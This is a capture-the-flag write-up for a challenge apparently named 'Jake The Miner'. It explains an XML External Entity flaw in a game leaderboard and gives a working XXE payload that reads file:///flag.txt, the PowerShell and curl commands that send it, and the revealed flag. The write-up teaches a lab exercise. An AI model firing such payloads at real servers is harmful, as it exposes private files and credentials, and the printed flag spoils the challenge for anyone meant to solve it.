# XXE Exploit Writeup: Jake The Miner CTF Challenge

## Overview

This challenge involves exploiting an XML External Entity (XXE) vulnerability in a game leaderboard feature. When you click **Submit Score**, the server processes your submitted XML data without properly restricting external entities, allowing you to read sensitive files on the server.

## What Happens After Clicking "Submit Score"?

Clicking **Submit Score** sends your XML input to the server. If the XML contains an external entity reference, the vulnerable XML parser fetches the file referenced by that entity and includes its contents in the score submission response. This allows attackers to read arbitrary files—such as the flag—from the server.

## What is XXE?

**XML External Entity (XXE)** is an XML vulnerability where an attacker defines custom entities in the Document Type Definition (DTD) of an XML document. These entities can reference local files or external URLs. When the XML parser processes the document, it replaces the entity references accordingly, potentially disclosing sensitive data or causing denial of service.

## Exploit Steps Using PowerShell

1. **Create the malicious XML payload** (`payload.xml`) with an external entity referencing the `flag.txt` file on the server:

```powershell
$xml = @'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY external SYSTEM "file:///flag.txt"> ]>
<score>&external;</score>
'@
Set-Content -Path .\payload.xml -Value $xml -Encoding UTF8
```

2. **Verify the payload file exists and check its content:**

```powershell
Get-ChildItem .\payload.xml
Get-Content .\payload.xml
```

3. **Send the malicious XML to the server endpoint** (replace `xxx` with the actual port or endpoint):

```powershell
curl.exe -s -X POST -H "Content-Type: application/xml" --data-binary "@.\payload.xml" "https://skrctf.me/ports/xxx/" | Select-String SKR
```

4. The server responds embedding the contents of `flag.txt` because of the XXE inclusion, returning the flag:

```
SKR{J4k3_L0v3_XXE!!_521843}
```

## Summary

This challenge demonstrates a classic XXE vulnerability allowing local file disclosure through crafted XML input. By defining an external entity in the DTD and referencing sensitive files, the server's XML parser inadvertently leaks confidential data upon score submission.
